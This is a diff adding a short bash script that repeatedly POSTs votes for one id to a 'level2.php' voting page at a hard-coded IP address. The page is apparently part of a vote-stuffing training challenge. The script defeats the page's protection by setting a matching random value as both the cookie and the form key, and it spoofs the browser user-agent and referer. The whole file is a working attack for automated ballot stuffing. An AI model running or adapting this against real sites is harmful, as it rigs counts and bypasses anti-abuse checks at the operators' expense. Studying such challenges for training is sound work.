@@ -1,0 +1,49 @@
+#!/usr/bin/env bash
+
+main()
+{
+	for _ in $(seq "${2-1}"); do
+		level2 "$@"
+	done
+}
+
+level2()
+{
+	url="http://158.69.76.135/level2.php"
+	id=2055
+	fake_key=$RANDOM
+	cookie="HoldTheDoor=$fake_key"
+	user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+	form_1="id=$id"
+	form_2="holdthedoor=submit"
+	form_3="key=$fake_key"
+
+	flags=()
+	flags+=(-s)
+	flags+=(--user-agent "$user_agent")
+	flags+=(--referer "$url")
+	flags+=(-F "$form_1")
+	flags+=(-F "$form_2")
+	flags+=(-F "$form_3")
+	flags+=(-X POST)
+	flags+=(-b "$cookie")
+	flags+=("$url")
+
+	case $1 in
+		-v)
+			curl "${flags[@]}" \
+				| grep $id -A 2 \
+				| cut -f1 -d" " \
+				| tr "\n" "\t"	\
+				; echo
+			;;
+		null)
+			curl "${flags[@]}" &> /dev/null
+			;;
+		*)
+			curl "${flags[@]}"
+			;;
+	esac
+}
+
+main "$@"
